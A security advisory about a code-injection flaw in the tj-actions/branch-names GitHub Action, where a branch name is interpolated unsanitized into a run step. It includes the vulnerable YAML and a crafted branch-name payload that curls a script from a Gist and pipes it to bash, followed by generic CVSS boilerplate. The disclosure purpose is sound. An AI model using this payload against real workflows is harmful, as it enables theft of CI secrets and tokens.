# Improper Sanitization of Branch Name Leads to Arbitrary Code Injection

## Description

### Summary

The `tj-actions/branch-names` GitHub Actions references the `github.event.pull_request.head.ref` and `github.head_ref` context variables within a GitHub Actions `run` step. The head ref variable is the branch name and can be used to execute arbitrary code using a specially crafted branch name.

### Details

The vulnerable code is within the `action.yml` file the `run` step references the value directly, instead of a sanitized variable.

```
runs:
  using: "composite"
  steps:
    - id: branch
      run: |
        # "Set branch names..."
        if [[ "${{ github.ref }}" != "refs/tags/"* ]]; then
          BASE_REF=$(printf "%q" "${{ github.event.pull_request.base.ref || github.base_ref }}")
          HEAD_REF=$(printf "%q" "${{ github.event.pull_request.head.ref || github.head_ref }}")
          REF=$(printf "%q" "${{ github.ref }}")
```

An attacker can use a branch name to inject arbitrary code, for example: `Test")${IFS}&&${IFS}{curl,-sSfL,gist.githubusercontent.com/RampagingSloth/72511291630c7f95f0d8ffabb3c80fbf/raw/inject.sh}${IFS}|${IFS}bash&&echo${IFS}$("foo` will download and run a script from a Gist. This allows an attacker to inject a payload of arbitrary complexity.

### Impact

An attacker can use this vulnerability to steal secrets from or abuse `GITHUB_TOKEN` permissions.

# CVSS v3 base metrics

Attack vector:
More severe the more the remote (logically and physically) an attacker can be in order to exploit the vulnerability.

Attack complexity:
More severe for the least complex attacks.

Privileges required:
More severe if no privileges are required.

User interaction:
More severe when no user interaction is required.

Scope:
More severe when a scope change occurs, e.g. one vulnerable component impacts resources in components beyond its security scope.

Confidentiality:
More severe when loss of data confidentiality is highest, measuring the level of data access available to an unauthorized user.

Integrity:
More severe when loss of data integrity is the highest, measuring the consequence of data modification possible by an unauthorized user.

Availability:
More severe when the loss of impacted component availability is highest.
